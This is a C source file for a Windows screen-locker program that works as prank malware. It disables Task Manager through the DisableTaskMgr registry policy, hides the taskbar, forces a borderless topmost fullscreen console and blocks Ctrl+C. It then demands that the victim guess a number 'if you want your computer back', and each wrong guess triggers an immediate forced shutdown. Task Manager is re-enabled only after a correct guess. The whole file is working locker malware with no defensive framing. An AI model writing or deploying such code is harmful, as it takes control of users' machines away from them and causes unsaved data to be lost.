#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

void kill_taskman() {
    HKEY hKey;
    DWORD value = 1;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, 0, KEY_WRITE, 0, &hKey, 0);
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);
}

void resurect_taskman() {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
    RegDeleteValueA(hKey, "DisableTaskMgr");
    RegCloseKey(hKey);
}

BOOL WINAPI ctrlHandler(DWORD type) {
    return TRUE;
}

void console_lock() {
    HWND console = GetConsoleWindow();

    LONG style = GetWindowLong(console, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_THICKFRAME);
    SetWindowLong(console, GWL_STYLE, style);
    SetWindowPos(console, HWND_TOPMOST, 0, 0, 0, 0,
                 SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED);
    
    HWND taskbar = FindWindow("Shell_TrayWnd", 0);
    ShowWindow(taskbar, SW_HIDE);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    MoveWindow(console, 0, 0, screenWidth, screenHeight, TRUE);
    
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD bufferSize = {160, 100};
    SMALL_RECT windowSize = {0, 0, bufferSize.X - 1, bufferSize.Y - 1};
    SetConsoleScreenBufferSize(hOut, bufferSize);
    SetConsoleWindowInfo(hOut, TRUE, &windowSize);
}
int main() {
    SetConsoleTitleA("Screen");
    SetConsoleCtrlHandler(ctrlHandler, TRUE);
    console_lock();
    kill_taskman();

    srand((unsigned int)time(0));
    int key = (rand() % 10) + 1;
    int guess = 0;

    printf("===Let's Play a little Game===\n");
    printf("if you want your computer back...\n");
    printf("than guess the number\n");

    while (1) {
        srand((unsigned int)time(0));
        int key = (rand() % 10) + 1;
        int guess = 0;
        printf("Enter guess 1-10 >:");
        fflush(stdout);
        scanf("%d", &guess);
        if (guess == key) {
            printf("\nYou Won!!! woohoo\n");
            resurect_taskman();
            HWND taskbar = FindWindow("Shell_TrayWnd", 0);
            ShowWindow(taskbar, SW_SHOW);
            exit(0);
        } else {
            printf("\nwrong\n");
            system("shutdown /s /t 0");
        }
    }

    return 0;
}